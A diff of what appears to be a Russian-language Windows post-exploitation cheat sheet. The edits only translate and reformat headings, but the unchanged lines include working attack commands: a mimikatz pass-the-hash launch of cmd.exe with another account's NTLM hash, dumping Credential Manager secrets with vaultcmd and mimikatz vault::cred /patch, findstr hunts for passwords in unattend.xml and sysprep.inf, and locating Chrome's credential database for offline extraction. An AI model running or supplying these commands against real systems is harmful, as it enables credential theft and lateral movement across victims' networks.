@@ -334,9 +334,9 @@ mimikatz Pass-the-Hash — запуск cmd.exe с NTLM-хэшем другог�
 .\mimikatz.exe "sekurlsa::pth /user:Administrator /domain:. /ntlm:<NTLM_HASH> /run:cmd.exe" exit
 ```
 
-**Диспетчер учётных данных Windows — перечисление и дамп сохранённых учётных данных.**
+Диспетчер учётных данных Windows — перечисление и дамп сохранённых учётных данных.
 
-(«Credential Manager» — «Диспетчер учётных данных».)
+> «Credential Manager» — «Диспетчер учётных данных»
 
 ```
 # Windows Credential Manager:
@@ -347,7 +347,7 @@ vaultcmd /listcreds:"Windows Credentials"
 .\mimikatz.exe "vault::cred /patch" exit
 ```
 
-Find cleartext credentials in Windows deployment files
+Поиск учётных данных в открытом виде в файлах развёртывания Windows.
 
 ```
 # Search for unattend.xml, sysprep.inf credentials:
@@ -356,7 +356,7 @@ findstr /si password C:\Windows\Panther\unattend.xml
 findstr /si password C:\Windows\system32\sysprep.inf
 ```
 
-Locate Chrome credential database for offline extraction
+Поиск базы данных учётных данных Chrome для офлайн-извлечения.
 
 ```
 # Browser credential extraction (Chrome):
